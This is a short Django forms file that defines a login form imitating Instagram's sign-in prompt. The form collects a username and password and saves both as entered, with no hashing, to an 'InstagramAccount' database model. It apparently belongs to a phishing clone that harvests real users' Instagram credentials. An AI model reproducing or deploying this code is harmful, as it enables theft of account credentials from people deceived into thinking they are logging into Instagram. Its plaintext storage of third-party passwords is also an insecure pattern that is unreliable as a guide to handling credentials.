# core/forms.py
from django import forms
from .models import InstagramAccount


class InstagramLoginForm(forms.ModelForm):
    class Meta:
        model = InstagramAccount
        fields = ['username', 'password']
        widgets = {
            'username': forms.TextInput(attrs={
                'placeholder': 'Phone number, username, or email',
                'class': 'w-full p-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm',
                'required': True,
                'autocomplete': 'username',
            }),
            'password': forms.PasswordInput(attrs={
                'placeholder': 'Password',
                'class': 'w-full p-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm',
                'required': True,
                'autocomplete': 'current-password',
            }),
        }
        labels = {
            'username': '',
            'password': '',
        }

    def clean_username(self):
        username = self.cleaned_data.get('username', '').strip()
        if not username:
            raise forms.ValidationError("Username or email is required.")
        return username.lower()

    def clean_password(self):
        password = self.cleaned_data.get('password', '')
        if not password:
            raise forms.ValidationError("Password is required.")
        if len(password) < 6:
            raise forms.ValidationError("Password must be at least 6 characters.")
        return password

  
    def save(self, commit=True):
        account = super().save(commit=False)
        if commit:
            account.save()
        return account